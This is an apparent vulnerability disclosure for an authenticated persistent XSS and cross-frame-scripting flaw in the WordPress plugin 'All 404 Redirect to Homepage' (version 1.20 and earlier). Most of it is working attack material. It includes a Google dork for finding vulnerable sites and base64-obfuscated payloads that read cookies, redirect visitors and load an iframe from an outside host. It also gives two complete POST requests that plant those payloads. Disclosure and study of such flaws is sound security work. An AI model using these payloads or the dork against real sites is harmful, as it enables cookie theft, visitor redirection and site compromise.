/*!
- # VULNERABILITY: All 404 Redirect to Homepage WordPress Plugin <= 1.20 - Authenticated Persistent XSS & XFS
- # GOOGLE DORK: inurl:/wp-content/plugins/all-404-redirect-to-homepage/
- # DATE: 2021-03-29
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: Fakhri Alsadi [ https://www.clogica.com ]
- # SOFTWARE VERSION: <= 1.20
- # SOFTWARE LINK: https://wordpress.org/plugins/all-404-redirect-to-homepage/
- # CVSS: AV:N/AC:L/PR:H/UI:N/S:C
- # CWE: CWE-79
- # CVE: N/A
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS & XFS vulnerabilities was discovered in the All 404 Redirect to Homepage plugin through v1.20 for WordPress.

[i] Vulnerable parameter(s): &redirect_to=.



### -- [ Impact: ]

[~] Malicious JavaScript code or iFrame injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] " autofocus=autofocus onfocus=eval(atob(`amF2YXNjcmlwdDphbGVydChgbTB6ZWApO2FsZXJ0KGRvY3VtZW50LmNvb2tpZSk7d2luZG93LmxvY2F0aW9uPSdodHRwczovL20wemUucnUvJzs=`)); "

[$] " autofocus=autofocus onfocus=eval(atob(`eD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTt4LnNyYz0naHR0cHM6Ly9tMHplLnJ1L3BheWxvYWQveGZzaWkuaHRtbCc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs=`)); "



### -- [ PoC #1 | Authenticated Persistent XSS & XFS | Redirect all 404 pages to: ]

[!] POST /wp-admin/options-general.php?page=all-404-redirect-to-homepage.php&tab=options HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 282
Cookie: [admin cookies]

p404_status=1&redirect_to=https%3A%2F%2Fm0ze.ru%22+autofocus%3Dautofocus+onfocus%3Deval%28atob%28%60amF2YXNjcmlwdDphbGVydChgbTB6ZWApO2FsZXJ0KGRvY3VtZW50LmNvb2tpZSk7d2luZG93LmxvY2F0aW9uPSdodHRwczovL20wemUucnUvJzs%3D%60%29%29%3B+%22&_wpnonce=88a432b100&Save_Options=++Update+Options++



### -- [ PoC #2 | Authenticated Persistent XSS & XFS | Redirect all 404 pages to: ]

[!] POST /wp-admin/options-general.php?page=all-404-redirect-to-homepage.php&tab=options HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 314
Cookie: [admin cookies]

p404_status=1&redirect_to=https%3A%2F%2Fm0ze.ru%22+autofocus%3Dautofocus+onfocus%3Deval%28atob%28%60eD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTt4LnNyYz0naHR0cHM6Ly9tMHplLnJ1L3BheWxvYWQveGZzaWkuaHRtbCc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs%3D%60%29%29%3B+%22&_wpnonce=88a432b100&Save_Options=++Update+Options++



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
